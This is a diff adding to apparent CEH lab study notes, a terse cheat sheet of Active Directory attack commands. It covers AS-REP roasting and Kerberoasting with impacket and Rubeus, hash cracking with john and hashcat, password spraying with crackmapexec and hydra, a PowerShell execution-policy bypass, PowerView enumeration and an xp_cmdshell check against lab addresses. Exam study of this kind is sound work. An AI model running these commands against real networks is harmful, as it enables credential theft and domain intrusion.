@@ -101,3 +101,38 @@ getSMS inbox
 
 
 cat ~/Documents/cryt-128-06encr.hex  --> xxd -r -p ~/Documents/cryt-128-06encr.hex > output.bin --> file output.bin --> openssl enc -aes-128-cbc -d -in output.bin
+
+
+
+ECC Style (AS-REP Roasting): 
+impacket-GetNPUsers CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22
+john --wordlist= hash.txt
+cme rdp 10.10.1.0/24 -u /root/ADtools/users.txt -p "cupcake"
+powershell -EP Bypass
+. .\PowerView.ps1
+hydra -L user.txt -P /root/ADtools/rockyou.txt 10.10.1.30 mssql
+
+Kerberoasting (On windows after meterpreter --> shell --> downloading rubeus from attacker machine): 
+rubeus.exe kerberoast /outfile:hash.txt
+type hash.txt
+hascat -m 13100 -a 0 --force hash.txt passlist.exe
+
+
+
+SQL:
+SELECT name, CONVERT(INT, ISNULL(value, value_in_use)) AS IsConfigured FROM sys.configurations WHERE name='xp_cmdshell';
+
+
+
+Get-NetOU - Lists all organizational units (OUs) in the domain.
+Get-NetSession - Lists active sessions on the domain.
+Get-NetLoggedon - Lists users currently logged on to machines.
+Get-NetProcess - Lists processes running on domain machines.
+Get-NetService - Lists services on domain machines.
+Get-NetDomainTrust - Lists domain trust relationships.
+Get-ObjectACL - Retrieves ACLs for a specified object.
+Find-InterestingDomainAcl - Finds interesting ACLs in the domain.
+Get-NetSPN - Lists service principal names (SPNs) in the domain.
+Invoke-ShareFinder - Finds shared folders in the domain.
+Invoke-UserHunter - Finds where domain admins are logged in.
+Invoke-CheckLocalAdminAccess - Checks if the current user has local admin access on specified machines.
